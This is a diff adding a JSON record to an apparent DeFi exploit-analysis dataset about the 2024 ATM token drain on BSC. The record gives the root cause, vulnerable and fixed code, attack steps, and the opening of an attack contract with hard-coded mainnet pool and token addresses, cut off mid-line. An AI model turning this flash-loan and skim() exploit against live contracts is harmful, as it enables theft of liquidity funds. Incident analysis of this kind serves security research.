@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-04-XX_ATM_FlashLoanSkim",
+ "source_file": "2024/2024-04-XX_ATM_FlashLoanSkim.md",
+ "title": "ATM — Flash Loan-Based Repeated skim Reserve Drain Analysis",
+ "date": "2024-04-01",
+ "protocol": "ATM",
+ "chain": "BSC",
+ "loss_raw": "~$182,000",
+ "loss_usd": 182000.0,
+ "root_cause": "Directly transferring ATM tokens into the V2 pair causes `balanceOf` to exceed the internal reserve, allowing excess extraction via `skim()` — a business logic flaw with no reserve synchronization",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: tax token + skim combination exploit\n// ATM token transfer applies tax → actual received amount < sent amount\n// skim(): extracts pair.balance - pair.reserve\n// Due to tax, reserve updates lag behind actual balance → mismatch occurs\n\ninterface Uni_Pair_V2 {\n    function skim(address to) external;\n    function sync() external;\n    function swap(uint, uint, address, bytes calldata) external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\n//",
+  "// File: ATM_decompiled.sol\ncontract ATM {\n    function balanceOf(address p0) external view returns (uint256) {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: disable skim on tax token pairs\nfunction skim(address to) external lock {\n    require(!isTaxToken, \"skim disabled for tax tokens\");\n    // ...\n}"
+ ],
+ "steps": [
+  "→ [1] Flash loan WBNB from V3 pool",
+  "→ [2] Swap WBNB → ATM (via USDT)",
+  "→ [3] Transfer ATM to V2 pair → repeat skim()",
+  "→ [4] Swap ATM → WBNB (reverse swap)",
+  "→ [5] Repay V3 flash loan",
+  "→ [6] ~$182K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Flash loan WBNB from V3 pool\n  │\n  ├─→ [2] Swap WBNB → ATM (via USDT)\n  │\n  ├─→ [3] Transfer ATM to V2 pair → repeat skim()\n  │         └─ Reserve decreases until below threshold\n  │\n  ├─→ [4] Swap ATM → WBNB (reverse swap)\n  │\n  ├─→ [5] Repay V3 flash loan\n  │\n  └─→ [6] ~$182K profit",
+  "interface Uni_Pair_V3 {\n    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;\n}\n\ninterface Uni_Pair_V2 {\n    function skim(address to) external;\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\ncontract AttackContract {\n    Uni_Pair_V3 constant v3Pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);\n    Uni_Pair_V2 constant v2Pair = Uni_Pair_V2(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);\n    IERC20      constant ATM    = IERC20(0xa5957E0E2565dc93880da7be32AbCBdF55788888);\n    IERC20      constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n\n    function testExploit() external {\n        v3Po"
+ ]
+}
